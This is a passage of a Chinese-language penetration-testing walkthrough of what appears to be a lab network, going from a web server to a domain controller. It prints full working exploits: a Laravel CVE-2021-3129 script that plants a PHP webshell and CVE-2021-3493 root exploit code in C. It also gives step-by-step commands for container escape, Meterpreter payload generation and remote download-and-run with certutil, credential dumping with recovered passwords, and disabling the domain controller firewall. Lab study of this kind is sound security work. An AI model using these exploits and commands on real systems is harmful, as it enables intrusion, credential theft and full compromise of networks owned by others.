class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669374007673-bb16188d-01fe-4f74-a314-0dc3d206a11a.png"></p><pre class="line-numbers language-none"><code class="language-none">收集一些这服务器的信息，用ifconfig，whoami等等命令，加油，骚年<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669374051679-f216df63-1027-4b7a-98bc-df5016cc5c57.png"></p><pre class="line-numbers language-none"><code class="language-none">nginx服务器配置文件看一看，我去发现这个81端口的web服务居然是内网192.168.52.20这台机子映射出来的，美滋滋，正好这web服务有漏洞，看我拿下它<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669374246690-7c7d8373-3d88-4944-b7a6-3d1590ffb98f.png"></p><pre class="line-numbers language-none"><code class="language-none">脚本给你贴出来了，记得在RCE5那里把id替换成一句话木马，木马命令记住base64加密一下，就可以用蚁剑连了，路径也要写哦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669374850225-5da79a86-eadb-444e-87f3-d597bbabaedf.png"></p><p>脚本地址：<a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p><pre class="line-numbers language-none"><code class="language-none"># -*- coding=utf-8 -*-# Author : Crispr# Alter: zhzykerimport osimport requestsimport sysfrom urllib3.exceptions import InsecureRequestWarning# Suppress only the single warning from urllib3 needed.requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)class EXP:    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用    __gadget_chains = {        "Laravel/RCE1":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE2":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE3":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE4":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE5":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7ID8+ |base64 -d  &gt; /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE6":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Laravel/RCE7":r"""         php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Monolog/RCE1":r"""         php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Monolog/RCE2":r"""         php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Monolog/RCE3":r"""         php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,        "Monolog/RCE4":r"""         php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"        """,    }    def __vul_check(self):        res = requests.get(self.__url,verify=False)        if res.status_code != 405 and "laravel" not in res.text:            print("[+]Vulnerability does not exist")            return False        return True    def __payload_send(self,payload):        header = {            "Accept": "application/json"        }        data = {            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",            "parameters": {                "variableName": "cve20213129",                "viewFile": ""            }        }        data["parameters"]["viewFile"] = payload                #print(data)        res = requests.post(self.__url, headers=header, json=data, verify=False)        return res    def __clear_log(self):        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"        return self.__payload_send(payload=payload)    def __generate_payload(self,gadget_chain):        generate_exp = self.__gadget_chains[gadget_chain]        #print(generate_exp)        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'        print("[+]exploit:")        #print(exp)        return exp    def __decode_log(self):        return self.__payload_send(            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")    def __unserialize_log(self):        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")    def __rce(self):        text = str(self.__unserialize_log().text)        #print(text)        text = text[text.index(']'):].replace("}","").replace("]","")        return text    def exp(self):        for gadget_chain in self.__gadget_chains.keys():            print("[*] Try to use %s for exploitation." % (gadget_chain))            self.__clear_log()            self.__clear_log()            self.__payload_send('A' * 2)            self.__payload_send(self.__generate_payload((gadget_chain)))            self.__decode_log()            print("[*] " + gadget_chain + " Result:")            print(self.__rce())    def __init__(self, target):        self.target = target        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")        if not self.__vul_check():            print("[-] [%s] is seems not vulnerable." % (self.target))            print("[*] You can also call obj.exp() to force an attack.")        else:            self.exp()def main():    EXP(sys.argv[1])if __name__ == "__main__":    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669374999006-e5521541-6d15-4940-a724-d91d3913dccc.png"></p><p><img src="/images/1669375110864-6011d2dd-e032-47b3-9ec6-26d5f931cce1.png"></p><pre class="line-numbers language-none"><code class="language-none">ok，掏出蚁剑干它，拿下，记得加端口号81，要不要连不上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669375386057-65d8453f-574d-48fb-a592-1b9fbeb5e542.png"></p><pre class="line-numbers language-none"><code class="language-none">然后用蚁剑的终端把shell弹给root@ubuntu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669375521365-320a561c-fef0-41fa-b133-4bd1a7d9caa8.png"></p><pre class="line-numbers language-none"><code class="language-none">这里用外网的ip弹不过去，得用内网ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669375690101-299761c6-c852-4d9f-bbeb-406cf53a8c2b.png"></p><pre class="line-numbers language-none"><code class="language-none">拿下了，可以看看该用户权限是啥，能不能进行suid提权等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669375735272-f688fba6-1e06-4a1f-8c64-54aadff80c79.png"></p><pre class="line-numbers language-none"><code class="language-none">好家伙，这是啥，为啥家目录下有个这个？？会不会里面有啥执行命令？？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669376052192-a90c7724-ba3a-45fb-8628-236c25782f58.png"></p><pre class="line-numbers language-none"><code class="language-none">果然不出所料，居然把系统命令ps放这了，试试用这个命令提权试试，直接创建一个虚假的ps命令，改一下path路径试试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669376192708-ba42aae9-b612-4429-bc4b-0a7896a37a79.png"></p><pre class="line-numbers language-none"><code class="language-none">成功了，拿下，命令贴这儿了，自己粘贴复制echo '/bin/bash' &gt; /tmp/pschmod 777 /tmp/psexport PATH=/tmp:$PATHecho $PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669376489595-1048de89-2240-4c85-bc95-9b77b973c796.png"></p><pre class="line-numbers language-none"><code class="language-none">把shell弹回ubuntu(web1)中，不弹也可以，接下来就要docker逃逸了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669377009865-978cf35d-93fc-449a-a892-3421d90ef1e3.png"></p><pre class="line-numbers language-none"><code class="language-none">首先介绍一下利用Docker runC漏洞逃逸该漏洞（CVE-2019-5736）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。利用该漏洞需要满足以下两个条件之一：1  由一个攻击者控制的恶意镜像创建，2  攻击者具有某已存在容器的写权限，且可通过docker exec进入。fdisk -l #查看磁盘文件ls /dev #查看设备文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669377290139-d51b914b-d1b6-467f-a8a7-5eab7ea57121.png"></p><p><img src="/images/1669377310729-157b903e-1660-4b4c-a67f-faf7a21b0bf4.png"></p><pre class="line-numbers language-none"><code class="language-none">去根目录创建一个文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669383346392-64006fcf-f0e1-47bd-b5a4-d1450948a580.png"></p><pre class="line-numbers language-none"><code class="language-none">进入挂载的目录，可以看到家目录中藏着一个ubuntu用户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669383402133-c31eff64-2988-41e1-ae9f-f898cd98dfde.png"></p><pre class="line-numbers language-none"><code class="language-none">接下来就可以将我们自己生成的ssh秘钥写入到/hello/home/ubuntu/.ssh目录中的authorized_keys文件中，写入成功之后就可以使用该密钥进行登陆该机器，ssh-keygen -f hellochmod 600 hello #赋予权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669383800725-3fc4cba1-c9c7-4ad3-8b0e-3b6f59f88b71.png"></p><pre class="line-numbers language-none"><code class="language-none">cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制echo &gt; /hello/home/ubuntu/.ssh/authorized_keys #清空authorized_keys文件echo '生成的.pub文件的内容' &gt; /hello/home/ubuntu/.ssh/authorized_keys #将ssh秘钥写入authorized_keys文件cat /hello/home/ubuntu/.ssh/authorized_keys #查看是否写入成功ssh -i hello ubuntu@192.168.52.20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669384242335-3b9c900d-39f8-463f-8a42-c409d7036d6c.png"></p><pre class="line-numbers language-none"><code class="language-none">shell成功到手，可以看看机子上的ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669384355718-a75c54f5-13b4-4e1e-86f2-000be4c5c823.png"></p><pre class="line-numbers language-none"><code class="language-none">可以看到这机子有两张网卡，看看它的版本有没有漏洞，还真有，这版本有漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669384485099-513bdf2a-fd2c-4a98-acdc-1720860a8928.png"></p><p><img src="/images/1669384640554-60162547-84ab-412d-8857-0fb589fcd7e4.png"></p><p>来利用ubuntu内核提权，脚本如下，脚本地址：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p><pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;sched.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;//#include &lt;attr/xattr.h&gt;//#include &lt;sys/xattr.h&gt;int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);#define DIR_BASE    "./ovlcap"#define DIR_WORK    DIR_BASE "/work"#define DIR_LOWER   DIR_BASE "/lower"#define DIR_UPPER   DIR_BASE "/upper"#define DIR_MERGE   DIR_BASE "/merge"#define BIN_MERGE   DIR_MERGE "/magic"#define BIN_UPPER   DIR_UPPER "/magic"static void xmkdir(const char *path, mode_t mode){    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)        err(1, "mkdir %s", path);}static void xwritefile(const char *path, const char *data){    int fd = open(path, O_WRONLY);    if (fd == -1)        err(1, "open %s", path);    ssize_t len = (ssize_t) strlen(data);    if (write(fd, data, len) != len)        err(1, "write %s", path);    close(fd);}static void xcopyfile(const char *src, const char *dst, mode_t mode){    int fi, fo;    if ((fi = open(src, O_RDONLY)) == -1)        err(1, "open %s", src);    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)        err(1, "open %s", dst);    char buf[4096];    ssize_t rd, wr;    for (;;) {        rd = read(fi, buf, sizeof(buf));        if (rd == 0) {            break;        } else if (rd == -1) {            if (errno == EINTR)                continue;            err(1, "read %s", src);        }        char *p = buf;        while (rd &gt; 0) {            wr = write(fo, p, rd);            if (wr == -1) {                if (errno == EINTR)                    continue;                err(1, "write %s", dst);            }            p += wr;            rd -= wr;        }    }    close(fi);    close(fo);}static int exploit(){    char buf[4096];    sprintf(buf, "rm -rf '%s/'", DIR_BASE);    system(buf);    xmkdir(DIR_BASE, 0777);    xmkdir(DIR_WORK,  0777);    xmkdir(DIR_LOWER, 0777);    xmkdir(DIR_UPPER, 0777);    xmkdir(DIR_MERGE, 0777);    uid_t uid = getuid();    gid_t gid = getgid();    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)        err(1, "unshare");    xwritefile("/proc/self/setgroups", "deny");    sprintf(buf, "0 %d 1", uid);    xwritefile("/proc/self/uid_map", buf);    sprintf(buf, "0 %d 1", gid);    xwritefile("/proc/self/gid_map", buf);    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)        err(1, "mount %s", DIR_MERGE);    // all+ep    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)        err(1, "setxattr %s", BIN_MERGE);    return 0;}int main(int argc, char *argv[]){    if (strstr(argv[0], "magic") || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], "shell"))) {        setuid(0);        setgid(0);        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);        err(1, "execl /bin/bash");    }    pid_t child = fork();    if (child == -1)        err(1, "fork");    if (child == 0) {        _exit(exploit());    } else {        waitpid(child, NULL, 0);    }    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);    err(1, "execl %s", BIN_UPPER);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">具体利用方法：进入tmp目录vim exploit.c #将下载的exploit.c的内容粘贴到该文件中gcc exploit.c -o exploit #编译chmod +x exploit./exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669387614208-c1451c69-845a-4a87-bd14-9e31a016e233.png"></p><p><img src="/images/1669387631772-2565c2a8-739c-4551-9c89-124faeda7db2.png"></p><pre class="line-numbers language-none"><code class="language-none">上线msf，先上线redis服务器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669388187474-da53eaf5-a8cc-4f1b-b95d-0e79384bb91c.png"></p><pre class="line-numbers language-none"><code class="language-none">第一个meterpreter到手，继续，拿第二个要费点劲，要先用meterpreter添加一个路由表，然后就可以利用了run get_local_subnetsrun autoroute -s 192.168.52.0 -n 255.255.255.0run autoroute -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669388401579-7ec2ffea-5ef2-4e5c-8402-36d4ac6c3a70.png"></p><pre class="line-numbers language-none"><code class="language-none">因为在Web1这台机器上通过尝试该机器安装有python3.6.9，那么我们可以将木马上传到Web1，通过python3开启一个http服务，使用Web2进行下载并运行我们的木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669388445697-11fc4374-ee1e-4fbd-80d7-2fe44fbababf.png"></p><pre class="line-numbers language-none"><code class="language-none">首先MSF生成木马，通过MSF上传到Web 1中msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=2020 -f elf -o 20.elfsessions 1upload /root/20.elf /tmp/20.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669388561894-a258b128-33ab-4e9e-a7d8-f05520962ce6.png"></p><p><img src="/images/1669388635079-ea1447b9-b0c7-4f02-b28c-055a7247b668.png"></p><pre class="line-numbers language-none"><code class="language-none">通过meterpreter模块把20.elf木马传进来了，然后用内网那台下载这个木马<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669389198059-bf396669-5e89-4029-9bda-544c12828e8d.png"></p><pre class="line-numbers language-none"><code class="language-none">拿下，细节把握好，你也可以拿下，加油骚年下一步要做的就是探测52网段还有没有存活主机，冲添加个路由# 自动添加路由    run post/multi/manage/autoroute    run autoroute -p设置模块use auxiliary/scanner/discovery/arp_sweep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669389850858-40d9785f-4769-434c-8a1e-ebcbfe634a8d.png"></p><pre class="line-numbers language-none"><code class="language-none">没扫出来，换个模块试试  use auxiliary/scanner/discovery/udp_probe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669390108120-c5dd8d99-dd23-4de2-a8f3-82f971b28d26.png"></p><pre class="line-numbers language-none"><code class="language-none">用ew工具搭建代理：工具地址自己下 https://github.com/idlefire/ew<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669390426316-7aed5f9a-94c6-41da-aa06-e053d503817f.png"></p><pre class="line-numbers language-none"><code class="language-none">把这工具通过meterpreter模块上传给外网那台ubuntu，通过它进52网段，别搞错了，要不然流量就出不来了，下面那台只有52和93网段，流量出不了外网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669390587686-91ec1be7-1e42-4130-89d0-a74202fa1eb2.png"></p><p><img src="/images/1669390749450-abd3839c-4f6f-48a7-b7d2-4801c00fdaea.png"></p><pre class="line-numbers language-none"><code class="language-none">这就进来了然后在本地使用如下命令开始监听./ew_for_linux64 -s rcsocks -l 1080 -e 8888意思是把1080端口的请求转发到8888端口然后在目标机器上输入./ew_for_linux64 -s rssocks -d 192.168.0.138 -e 8888  ip记得改成自己攻击机的ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669390938359-a13d3ecd-cab9-4607-8158-abe8b6c46eb1.png"></p><pre class="line-numbers language-none"><code class="language-none">代理成功挂上，记得把proxychains4.conf改一下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669391080076-1eb0f699-1a25-46eb-9951-871751a4973b.png"></p><p><img src="/images/1669391059648-7d6a272b-32a3-4f29-9f10-c11653ee18f0.png"></p><pre class="line-numbers language-none"><code class="language-none">直接用nmap挂全局代理扫192.168.52.30此台机proxychains4 nmap -Pn -sT -sV 192.168.52.30扫不出来，扫个鬼，记得手动关下pc1的防火墙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669392879247-4efceca5-d980-48d3-b907-d823629e4fd5.png"></p><pre class="line-numbers language-none"><code class="language-none">关了就好了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669393816527-864160f1-f2c6-43ee-9936-323a3c5719f5.png"></p><pre class="line-numbers language-none"><code class="language-none">发现了web服务，给浏览器挂上socks代理访问看看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669393878653-06a54818-f3fd-4b41-bb73-1c75f3c51f6b.png"></p><pre class="line-numbers language-none"><code class="language-none">发现是通达oa，网上搜一下发现这个版本是有漏洞的，利用一下试试看，也许成功了呢<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669393932464-cba926b8-d64e-423f-83f8-df1b062a1938.png"></p><pre class="line-numbers language-none"><code class="language-none">burp抓包有两个点记得改，一是burp的8080端口被占用了，换个端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669394149789-ee96b1d1-0408-40ed-a970-98d99d818f7f.png"></p><pre class="line-numbers language-none"><code class="language-none">而是给burp挂上代理，要不然抓不到包别怪我<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669394250538-5c2c7e63-cee2-4fd0-b495-f41733224299.png"></p><p>具体漏洞看这个：<a href="https://blog.csdn.net/szgyunyun/article/details/107104288">https://blog.csdn.net/szgyunyun/article/details/107104288</a></p><p>再给你放上代码，复制粘贴就行，不用改</p><pre class="line-numbers language-none"><code class="language-none">POST /ispirit/interface/gateway.php HTTP/1.1Host: 192.168.52.30:8080Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.21.0Content-Length: 69Content-Type: application/x-www-form-urlencodedjson={"url":"/general/../../attach/im/2102/1811843809.shell.jpg"}&amp;cmd=whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669394463973-352cc0c9-0452-491f-99a1-9935294cf7fa.png"></p><pre class="line-numbers language-none"><code class="language-none">这就成了，传一个msfvenom马就行生成木马msfvenom -p windows/meterpreter/bind_tcp lport=9091 -f exe &gt; win7_9091.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669394814574-fff64425-0db3-449b-a2ad-15d9dba71c38.png"></p><pre class="line-numbers language-none"><code class="language-none">打开session 1会话<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669395014544-84e8f6ae-929b-4ee6-8352-6aa1bf7894d3.png"></p><pre class="line-numbers language-none"><code class="language-none">然后在用那台机子开启http服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669395098581-93649b8e-5d90-4862-a446-4bcc10fad1c0.png"></p><pre class="line-numbers language-none"><code class="language-none">下载win7_9091.exe并重命名为exploit.exe certutil.exe -urlcache -split -f http://192.168.52.10:8000/win7_9091.exe exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669395412938-42fba942-eeb5-44f1-b145-a7abea691481.png"></p><pre class="line-numbers language-none"><code class="language-none">拿下了用msf上线use exploit/multi/handler<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669395609601-df9260cb-dc07-47a2-8195-6d4b4666a06c.png"></p><p><img src="/images/1669395668994-915751e3-90f3-4889-8ff0-ba0fadf739d8.png"></p><pre class="line-numbers language-none"><code class="language-none">把上传的那个文件再执行下就行了，shell到手<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669395731089-cbc1915c-531d-4b93-b87c-f541f9d52000.png"></p><p><img src="/images/1669395829786-67e83b22-6cca-4ce8-9372-3b80ca91bde5.png"></p><pre class="line-numbers language-none"><code class="language-none">老规矩ipconfig /all   # 查看本机ip，所在域net view        # 查看局域网内其他主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669395994448-c617408c-227f-4f03-88d1-12e6da34dfae.png"></p><p><img src="/images/1669396013855-0347d842-4d06-4d1c-8d39-99457300edd1.png"></p><p><img src="/images/1669396080470-4e93cc8b-27a5-4f51-abf4-9c119f217af2.png"></p><pre class="line-numbers language-none"><code class="language-none">ping 一下pc2 和 dc看看，拿到关键信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669396217296-6e88ed1d-9b1e-4a48-adcd-d7cd7cbd871a.png"></p><pre class="line-numbers language-none"><code class="language-none">猕猴桃吃起load kiwikiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669396336681-af980fb5-5b4d-4a7f-8908-281388daafe7.png"></p><pre class="line-numbers language-none"><code class="language-none">错误提示发现kiwi默认加载32位，不能接受64位。需要把meterpreter进程迁移到64的进程上面，才能加载64位的猕猴桃。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669396401664-1bce0aca-b3e1-46c9-97bd-0d5eaa03cb90.png"></p><pre class="line-numbers language-none"><code class="language-none">移到一个64位的进程中去，再来一次猕猴桃<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669396458197-bbe5c1fd-92e7-47d7-8935-89d79181b999.png"></p><pre class="line-numbers language-none"><code class="language-none">抓取到两个密码，一个是域控机的，一个是本地的(PC1)    Whoami2021    Bunny2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669396563906-7a572c31-5573-4e84-a78e-b02452994867.png"></p><pre class="line-numbers language-none"><code class="language-none"> 关闭域控防火墙 获取到域控的账户密码了，直接开打    net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"    sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"    sc \\192.168.93.30 start unablefirewall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669396720279-f2f0c2b6-5ff5-464e-a3a7-19c42044f84f.png"></p><pre class="line-numbers language-none"><code class="language-none">防火墙以关，冲<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669396762929-31ea52a7-7697-4e15-b386-22821f341507.png"></p><pre class="line-numbers language-none"><code class="language-none">获取DC 尝试写计划任务获取DC    # 添加路由进入到pc1的meterpreter中写入路由run post/multi/manage/autorouterun autoroute -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669396935721-7672635c-7f77-48cb-b556-f91882ece55e.png"></p><pre class="line-numbers language-none"><code class="language-none">1.生成木马    msfvenom -p windows/meterpreter/bind_tcp LPORT=8888 -f exe -o smb_8888.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669397149016-18cf7d71-53d3-47d3-8eb0-ab8a4d2b3276.png"></p><pre class="line-numbers language-none"><code class="language-none">2.上传木马到PC1<span 